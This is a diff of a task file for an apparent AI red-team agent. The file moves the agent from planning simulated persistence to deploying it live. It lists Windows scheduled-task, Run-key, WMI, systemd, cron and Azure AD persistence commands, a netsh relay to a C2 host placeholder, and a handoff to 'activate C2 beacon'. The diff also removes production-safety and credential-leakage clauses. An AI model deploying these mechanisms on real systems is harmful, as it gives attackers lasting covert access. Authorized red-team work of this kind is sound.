@@ -3,67 +3,75 @@
 # Task: installation-phase
 
 ## Purpose
-- Plan simulated persistence mechanisms that maintain footholds while respecting ROE and defensive expectations.
-- Produce docs/red-team/persistence-plan.md with technique catalog, dwell-time analysis, detection coverage, and rollback steps.
+- **Deploy and validate** authorized persistence mechanisms to maintain foothold after exploitation.
+- Produce `docs/red-team/persistence-report.md` with **live artefacts**, system modifications, and defender-aware telemetry.
 
 ## Prerequisites
-- docs/red-team/exploit-report.md
-- Access to lab hosts or simulation environment reflecting target OS/platforms.
-- Directories: scripts/persistence, reports/persistence.
+- `docs/red-team/exploit-report.md` (with **confirmed access**)
+- Access to **authorized lab hosts** or approved target scope.
+- Directories: `scripts/persistence/`, `reports/persistence/`.
 
 ## Success Criteria
-- Persistence options mapped to ATT&CK techniques (e.g., T1053 Scheduled Task, T1547 Registry Run Keys, T1543 Systemd Service, T1098 Account Manipulation).
-- Each option includes prerequisites, installation commands, detection artefacts (logs, registry keys, services), and safe removal instructions.
-- Risk ratings (impact, dwell time, noise) documented alongside defender mitigation notes.
-- Handoff to C2 Agent lists established footholds and communication expectations.
+- Persistence mechanisms **executed and verified** on live systems.
+- **Proof of persistence** captured: registry keys, cron entries, service configs, cloud objects.
+- ATT&CK technique coverage documented (T1053, T1547, T1543, T1098).
+- **Artefact paths, hashes, and logs** stored in `reports/persistence/`.
+- Clear handoff to C2 Agent with **confirmed foothold stability**.
 
 ## Safety & Compliance
-- Default to simulation unless live persistence is approved; never deploy on production systems without authorisation.
-- Provide clear rollback scripts/commands and ensure they are tested in the same environment.
-- Avoid credential or token leakage in documentation; tokenise sensitive data.
+- **Never deploy persistence without explicit user confirmation per mechanism.**
+- Default to **lab-safe targets** (127.0.0.1, lab domains) unless real targets are approved.
+- **Log every command, output, and artefact** with UTC timestamps.
+- **Immediately remove** persistence if unintended impact occurs; document rollback steps.
 
 ## Recommended Tooling
 | Tool | Command | Goal | Expected Output |
 | --- | --- | --- | --- |
-| schtasks | `schtasks /Create /RU SYSTEM /SC ONLOGON /TN "Updater" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\updater.ps1"` | Model Windows scheduled task persistence. | Success message confirming task creation. |
-| reg add | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %APPDATA%\\updater.ps1" /f` | Simulate Run key persistence. | Registry modification success message. |
-| netsh portproxy | `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress={{c2_host}}` | Establish TCP relay for covert C2 persistence. | Confirmation of port proxy entry. |
-| systemd service | `sudo tee /etc/systemd/system/rt-sync.service <<'EOF'
-[Unit]
-Description=Red Team Simulated Sync
+| schtasks | `schtasks /Create /RU SYSTEM /SC ONLOGON /TN "Updater" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\updater.ps1"` | **Deploy** Windows scheduled task persistence. | Success message + task verification log. |
+| reg add | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %APPDATA%\\updater.ps1" /f` | **Deploy** Run key persistence. | Registry confirmation + `reg query` verification. |
+| netsh portproxy | `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress={{c2_host}}` | **Establish** TCP relay for C2. | Portproxy confirmation + `netsh interface portproxy show all` output. |
+| systemd service | `sudo tee /etc/systemd/system/rt-sync.service <<'EOF' ... EOF` | **Deploy** Linux systemd service. | File creation + `systemctl status rt-sync` output. |
+| crontab | `(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/python3 /opt/rt/sync.py >> /var/log/rt-sync.log 2>&1") | crontab -` | **Deploy** cron-based persistence. | Crontab list showing new entry. |
+| wmiexec | `wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name='RTLogon' ...` | **Deploy** WMI event subscription. | WMI object creation + `Get-WmiObject` verification. |
+| az cli | `az ad app create --display-name "Contoso Sync Agent" --credential-description "RedTeamSim"` | **Deploy** Azure AD application. | JSON response with appId + `az ad app show` verification. |
 
-[Service]
-ExecStart=/usr/bin/python3 /opt/rt/sync.py
-Restart=on-failure
-
-[Install]
-WantedBy=multi-user.target
-EOF` | Document Linux systemd service persistence. | File creation confirmation; follow with `systemctl enable --now`. |
-| crontab | `(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/python3 /opt/rt/sync.py >> /var/log/rt-sync.log 2>&1") | crontab -` | Simulate cron-based persistence. | Crontab updated (no output). |
-| wmiexec | `wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name='RTLogon', EventNamespace='Root\\Cimv2', Query=""SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'""` | Demonstrate WMI event subscription persistence. | WMI object creation confirmation. |
-| az cli | `az ad app create --display-name "Contoso Sync Agent" --credential-description "RedTeamSim"` | Plan cloud persistence through Azure AD application. | JSON response with appId/objectId (store securely). |
+> ⚠️ **All tools require explicit user confirmation before execution.**
 
 ## Procedure
-1. Review exploit-report.md and confirm available footholds, credentials, and platform coverage.
-2. Establish persistence requirements: dwell-time expectations, resilience, stealth vs. reliability, mandated kill-switch conditions.
-3. Select candidate techniques across operating systems, cloud, and identity planes. Note prerequisites (privileges, binaries, registry access).
-4. For each technique:
-   - Draft commands/scripts to establish persistence (schtasks, systemd, WMIC, az CLI, etc.).
-   - Capture expected artefacts (registry paths, service names, cron entries, cloud audit logs).
-   - Define monitoring and detection (e.g., Sysmon Event IDs 4698/4699, Azure AD audit logs, Linux journal entries).
-   - Provide rollback commands and verification steps (e.g., schtasks /Delete, systemctl disable, az ad app delete).
-5. Assess risk: rank each option for impact, noise, operational complexity, and defender visibility. Maintain scorecard in reports/persistence.
-6. Document alternative or layered persistence (e.g., primary scheduled task plus cloud identity backup) with caution on redundancy vs. detection risk.
-7. Populate docs/red-team/persistence-plan.md via template sections (Summary, Inputs, Technique Catalog, Detections, Mitigations, Handoff).
-8. Store scripts under scripts/persistence with clear headers noting simulation status and removal instructions.
-9. Prepare handoff brief for C2 Agent including active footholds, communication prerequisites, and monitoring notes.
+1. Review `exploit-report.md` to identify **confirmed access** (e.g., `www-data@127.0.0.1`, `admin@ubuntu-lab`).
+2. Define persistence requirements: dwell-time, resilience, stealth, kill-switch conditions.
+3. For each candidate technique:
+   - **Prompt user**: “Deploy [technique] on [target]? (y/N)”
+   - **If confirmed**, execute command, capture full output, store in `reports/persistence/{{technique}}-{{timestamp}}.log`
+4. **Validate persistence**:
+   - Windows: `schtasks /Query /TN "Updater"`, `reg query HKCU\...\Run`
+   - Linux: `systemctl status rt-sync`, `crontab -l`
+   - Cloud: `az ad app list --display-name "Contoso Sync Agent"`
+5. Document each mechanism including:
+   - **Execution command and output**
+   - **Artefact path** (e.g., `/etc/systemd/system/rt-sync.service`)
+   - **Verification output** (e.g., `Active: active (running)`)
+   - **Detection signals** (e.g., “Sysmon Event 4698: Scheduled Task Created”)
+   - **Kill-switch**: `schtasks /Delete /TN "Updater"`, `sudo systemctl disable --now rt-sync`
+6. Assess risk: if detection likelihood is too high, recommend alternatives or abort.
+7. Populate `docs/red-team/persistence-report.md` via template with:
+   - **Real artefact paths**
+   - **UTC timestamps**
+   - **SHA256 hashes** (for script files)
+8. Store persistence scripts in `scripts/persistence/` with headers noting **execution status**.
+9. Prepare handoff brief for C2 Agent:
+   > “Persistence confirmed on 127.0.0.1 via systemd service `rt-sync`.  
+   > Service active and resilient to reboot.  
+   > Next: activate C2 beacon.”
 
 ## Decision Gates
-- **Privilege Check**: confirm required privileges exist; if not, coordinate with Exploitation Agent for escalation or alternative technique.
-- **Resilience vs. Stealth**: choose technique aligned with mission priorities; document reasoning.
-- **Cloud Governance**: ensure cloud persistence actions comply with tenant policies; escalate if restrictions apply.
+- **User Confirmation**: **Never auto-deploy** — require “y” per mechanism.
+- **Privilege Validation**: if command fails due to permissions, log error and suggest escalation.
+- **Impact Check**: if system instability occurs, immediately trigger kill-switch.
+- **Detection Alert**: if local EDR/SIEM triggers, log event and consider pausing.
 
 ## Outputs
-- `docs/red-team/persistence-plan.md`
-- Supporting artefacts in `reports/persistence/` and scripts in `scripts/persistence/`
-- Handoff summary for C2 phase.
+- `docs/red-team/persistence-report.md` (**with live persistence evidence**)
+- **Real logs and artefacts** in `reports/persistence/`
+- **Persistence scripts** in `scripts/persistence/`
+- Handoff summary for C2 phase with **confirmed foothold status**
